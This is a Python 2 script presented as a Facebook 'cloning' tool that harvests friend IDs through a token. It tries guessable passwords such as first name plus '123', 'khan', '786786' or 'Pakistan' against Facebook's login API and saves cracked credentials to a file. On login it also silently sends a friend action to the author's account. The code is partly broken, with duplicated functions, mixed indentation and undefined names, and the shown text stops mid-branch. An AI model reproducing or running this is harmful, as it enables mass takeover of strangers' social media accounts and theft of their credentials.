#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To BabarAli
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)

#Dev:Babar_Ali
##### LOGO #####
logo = """
\033[1;93m|-------+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-----|
\033[1;93m|               Pak Anonymous               |
\033[1;93m|This Tool is Only for Pakistani FB Accounts|
\033[1;93m|------+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+------|
\033[1;92m•-----------------\033[1;34mKali.linux\033[1;92m-----------------•

\033[1;41m\033[1;37m[⚡⚡\033[1;37mAuthor Name: Babar Ali     ⚡⚡\033[1;37m]\033[1;0m
\033[1;41m\033[1;37m[⚡⚡\033[1;37mPhone Numbr: +923000223253 ⚡⚡\033[1;37m]\033[1;0m
\033[1;41m\033[1;37m[⚡⚡\033[1;37mYutube Chnl: Pak Anonymous ⚡⚡\033[1;37m]\033[1;0m
\033[1;41m\033[1;37m[⚡⚡       \033[1;37mFrom: Pakistan      ⚡⚡\033[1;37m]\033[1;0m

\033[1;92m•-----------------\033[1;34mKali.linux\033[1;92m-----------------•
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;95m██╗░░██╗░█████╗░██╗░░░░░██╗
\033[1;95m██║░██╔╝██╔══██╗██║░░░░░██║
\033[1;95m█████═╝░███████║██║░░░░░██║
\033[1;95m██╔═██╗░██╔══██║██║░░░░░██║
\033[1;95m██║░╚██╗██║░░██║███████╗██║
╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝
      \033[1;95m██╗░░░░░██╗███╗░░██╗██╗░░░██╗██╗░░██╗
      \033[1;95m██║░░░░░██║████╗░██║██║░░░██║╚██╗██╔╝
      \033[1;95m██║░░░░░██║██╔██╗██║██║░░░██║░╚███╔╝░
      \033[1;95m██║░░░░░██║██║╚████║██║░░░██║░██╔██╗░
      \033[1;95m███████╗██║██║░╚███║╚██████╔╝██╔╝╚██╗
      \033[1;95m╚══════╝╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝
\033[1;91m•──────────────────────────•
\033[1;91mNote: \033[1;97mWelcome Sir/Mam 
\033[1;97mEnter Tool Username and Password 
And Continue
\033[1;91m•──────────────────────────•
 """
CorrectUsername = "kalilinux"
CorrectPassword = "Facebook"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Username \x1b[1;91m: \x1b[1;92m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;92m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Babar_Ali
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;93mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print "\033[1;97m[1]\033[1;47m\033[1;31m1_7 Fast Cloning               \033[1;0m"
	print "\033[1;97m[2]\033[1;47m\033[1;31mLogin With Facebook              \033[1;0m"
        time.sleep(0.05)
        print "\033[1;97m[3]\033[1;47m\033[1;31mLogin With Token                 \033[1;0m"
        time.sleep(0.05)
        print "\033[1;97m[4]\033[1;47m\033[1;31mDownload Token App               \033[1;0m"
        time.sleep(0.05)
	print "\033[1;97m[0]\033[1;47m\033[1;31mExit                             \033[1;0m"
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;97m[+] \033[0;31mSelect Option: \033[1;91m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		Babarali()
	elif peak =="2":
		login1()
        elif peak =="3":
	        token()
        elif peak =="4":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo                
		print "\033[1;92m•-----------------\033[1;34mKali.linux\033[1;92m-----------------•"
		print('\033[1;97m[+]\033[1;36mLOGIN WITH FACEBOOK\x1b[1;97m' )
		print('	' )
		id = raw_input('\033[1;97m[!] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[+] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;93m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful•'
				os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:Babar_Ali
	print logo
	print "\033[1;37m[!]\033[1;93m Logged in User Info\033[1;92m"
	print "\033[1;37m[•]\033[1;91m Name\033[1;93m:\033[1;91m"+nama+"\033[1;93m               "
	print "\033[1;37m[•]\033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              "
	print "\033[1;92m•-----------------\033[1;34mKali.linux\033[1;92m-----------------•"
	print "\033[1;97m[1]\033[1;47m\033[1;31mStart Hacking                                    \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[2]\033[1;47m\033[1;31mID Not Found Problem                             \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[3]\033[1;47m\033[1;31mJoin Pak Anonymous Whatsapp Group                \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[4]\033[1;47m\033[1;31mContact With Pak Anonymous Owner On Facebook     \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[5]\033[1;47m\033[1;31mSubscribe Pak Anonymous Youtube Channel          \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[6]\033[1;47m\033[1;31mRest/Update Tool                                 \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[0]\033[1;47m\033[1;31mExit                                             \033[1;0m"
	time.sleep(0.05)
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;95mChoose an Option: \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
        elif unikers =="1":		
	        super()
	elif unikers =="2":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
	elif unikers =="3":
		os.system('xdg-open https://chat.whatsapp.com/FlzjJ1wklTo3EvKtkSfwRZ')
	        menu()
        elif unikers =="4":
		os.system('xdg-open https://facebook.com/Babar.ali7500')
	        menu()
	elif unikers =="6":
		os.system('xdg-open https://m.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
	elif unikers =="6":
		os.system('clear')
		print logo1
		print "\033[1;95m...............\033[1;91mDataReset\033[1;95m.................."
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
                jalan('\033[1;91mCloning Data Reset and update')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	        menu()		
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
def pilih():
	unikers = raw_input("\n\033[1;91mChoose an Option: \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
        elif unikers =="3":
		os.system('xdg-open https://chat.whatsapp.com/FlzjJ1wklTo3EvKtkSfwRZ')
	        menu()
        elif unikers =="4":
		os.system('xdg-open https://facebook.com/Babar.ali7500')
	        menu()
	elif unikers =="5":
		os.system('xdg-open https://m.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
                 menu()
        elif unikers =="6":
		os.system('xdg-open https://m.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
	elif unikers =="6":
		os.system('clear')
		print logo1
		print "\033[1;95m...............\033[1;91mDataReset\033[1;95m.................."
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
                jalan('\033[1;91mCloning Data Reset and update')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	        menu()		
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m[1]\x1b[1;93mHack From Friend List"
	print "\033[1;97m[2]\x1b[1;93mHack From Public Accounts"
	print "\033[1;97m[0]\033[1;95mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;94mChoose an Option: \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print "\033[1;95m«-----------------\033[1;91mKalilinux\033[1;95m-----------------»"
		print logo
		jalan('\033[1;93mGetting Accounts \033[1;93m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print "\033[1;95m«-----------------\033[1;91mKalilinux\033[1;95m-----------------»"
		print logo
		idt = raw_input("\033[1;96m[*] \033[1;92mEnter ID\033[1;93m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;92mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		print"\033[1;93mGetting Accounts\033[1;93m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;93mTotal Accounts\033[1;93m: \033[1;97m"+str(len(id))
	jalan('\033[1;93mWait\033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93m•Cloning Has Been Started•\033[1;93m"+o),;sys.stdout.flush();time.sleep(0.05)
	print "\n\033[1;92mNOTE:\x1b[1;93m [If You Want to Stop Process Press CTRL+Z]"
	print "\033[1;95m«-----------------\033[1;91mKalilinux\033[1;95m-----------------»"
 	
			
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:love_hacker
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				    print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				    print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				            print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				               print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'								
						       print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + 'khan'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '786786'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'						
						                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
						                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
						                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = 'Pakistan'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				                                                           print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                           print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
				                                                           print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                               print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'					
									                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '786'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				                                                                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
				                                                                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '786'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[ * ] \x1b[1;92m[OK]'			
											                                       print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
											                                       print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
